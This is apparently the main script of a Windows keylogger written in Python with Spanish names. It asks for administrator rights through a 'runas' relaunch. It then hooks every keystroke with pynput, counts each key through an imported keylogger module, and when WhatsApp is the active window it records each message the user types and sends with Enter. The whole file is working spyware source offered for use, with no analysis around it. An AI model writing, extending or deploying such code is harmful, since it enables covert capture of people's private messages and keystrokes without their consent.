import ctypes
import sys
from pynput import keyboard

from keylogger import contar_tecla
from wsp_logger import guardar_mensaje, es_whatsapp_activo

buffer = ""

# ========================
# ADMIN
# ========================
def es_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not es_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

# ========================
# TECLADO
# ========================
def on_press(key):
    global buffer

    tecla_str = ""

    try:
        if key.char:
            tecla_str = key.char.lower()
            buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            tecla_str = "ESPACIO"
            buffer += " "
        elif key == keyboard.Key.enter:
            tecla_str = "ENTER"
        elif key == keyboard.Key.backspace:
            tecla_str = "BACKSPACE"
            buffer = buffer[:-1]
        else:
            tecla_str = str(key)

    # Contador global
    if tecla_str:
        contar_tecla(tecla_str)

    # Solo WhatsApp
    if es_whatsapp_activo() and key == keyboard.Key.enter:
        mensaje = buffer.strip()

        if mensaje:
            guardar_mensaje(mensaje)

        buffer = ""

# ========================
# START
# ========================
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    pass